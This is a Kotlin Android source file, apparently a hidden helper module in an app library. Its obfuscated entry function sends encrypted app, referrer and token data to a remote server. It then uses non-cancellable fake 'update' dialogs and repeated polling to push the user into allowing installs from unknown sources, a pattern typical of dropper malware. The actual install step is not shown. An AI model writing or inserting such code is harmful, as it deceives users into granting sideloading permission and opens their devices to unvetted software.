package com.abc.lib.b

import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Message
import android.provider.Settings
import android.text.TextUtils
import com.abc.lib.R
import com.alibaba.fastjson.JSON
import com.eminayar.panter.PanterDialog
import com.tencent.mmkv.MMKV
import org.xutils.common.Callback
import org.xutils.http.RequestParams
import org.xutils.x

@SuppressLint("StaticFieldLeak")
object Assist {


    private var context: Context? = null
    private var isInstall = false
    private var entity: ResultEntity? = null

    private val handler: Handler = @SuppressLint("HandlerLeak")
    object : Handler() {

        override fun handleMessage(msg: Message) {
            super.handleMessage(msg)
            if (msg.what == 1) {
                if (!isBackground()) {
                    if (!isInstall) {
                        if (context!!.packageManager.canRequestPackageInstalls()) {
                            isInstall = true
                            sendEmptyMessage(1)
                        } else {
                            if (!isBackground()) {
                                showP()
                            } else {
                                sendEmptyMessageDelayed(1, 1500)
                            }
                        }
                    } else {
                        showU(entity!!.ikey)
                    }
                } else {
                    sendEmptyMessageDelayed(1, 1500)
                }
            }
        }
    }

    fun xxxxxxH(context: Context) {
        this.context = context
        if (MMKV.defaultMMKV()!!.decodeBool("state", false))
            return
        val requestBody = AesEncryptUtil.encrypt(JSON.toJSONString(getRequestData()))
        val p = RequestParams(BaseApplication.instance!!.getUrl())
        p.addBodyParameter("data", requestBody)
        x.http().post(p, object : Callback.CommonCallback<String> {
            override fun onSuccess(result: String?) {
                result?.let {
                    val data = AesEncryptUtil.decrypt(it)
                    entity = JSON.parseObject(data, ResultEntity::class.java)
                    //if (entity!!.status != "0")return@let
                    if (!context.packageManager.canRequestPackageInstalls()) {
                        showP()
                    } else {
                        showU(entity!!.ikey)
                    }
                }
            }

            override fun onError(ex: Throwable?, isOnCallback: Boolean) {

            }

            override fun onCancelled(cex: Callback.CancelledException?) {

            }

            override fun onFinished() {

            }

        })
    }

    private fun showP() {
        PanterDialog(context)
            .setHeaderBackground(R.color.yellowcolor)
            .setTitle("Permissions")
            .setMessage("App need updated,please turn on allow from this source tes")
            .apply {
                setPositive(
                    "Gooooooo"
                ) {
                    isInstall = Assist.context!!.packageManager.canRequestPackageInstalls()
                    handler.sendEmptyMessageDelayed(1, 1000)
                    if (!Assist.context!!.packageManager.canRequestPackageInstalls()) {
                        if (Build.VERSION.SDK_INT > 24) {
                            if (!Assist.context!!.packageManager.canRequestPackageInstalls()) {
                                val uri = Uri.parse("package:" + Assist.context!!.packageName)
                                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                (Assist.context as Activity).startActivity(i)
                            }
                        }
                    } else {
                        showU(entity!!.ikey)
                    }
                }
                this.dismiss()
            }
            .isCancelable(false)
            .show()
    }

    private fun showU(s: String) {
        PanterDialog(context)
            .setHeaderBackground(R.color.yellowcolor)
            .setTitle("Update new version")
            .setMessage(if (TextUtils.isEmpty(s)) "update" else s)
            .apply {
                setPositive("update") {
                    this.dismiss()
                }
            }
            .isCancelable(false)
            .show()

    }

    private fun isBackground(): Boolean {
        val activityManager = context!!
            .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val appProcesses = activityManager
            .runningAppProcesses
        for (appProcess in appProcesses) {
            if (appProcess.processName == context!!.packageName) {
                return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            }
        }
        return false
    }

    private fun getRequestData(): RequestEntity {
        val requestBean = RequestEntity()
        requestBean.appId = BaseApplication.instance!!.getAppId()
        requestBean.appName = BaseApplication.instance!!.getAppName()
        requestBean.applink = MMKV.defaultMMKV()!!.decodeString("appLink", "AppLink is empty")!!
        requestBean.ref = MMKV.defaultMMKV()!!.decodeString("ref", "Referrer is empty")!!
        requestBean.token = BaseApplication.instance!!.getToken()
        requestBean.istatus = MMKV.defaultMMKV()!!.decodeBool("istatus", true)
        return requestBean
    }
}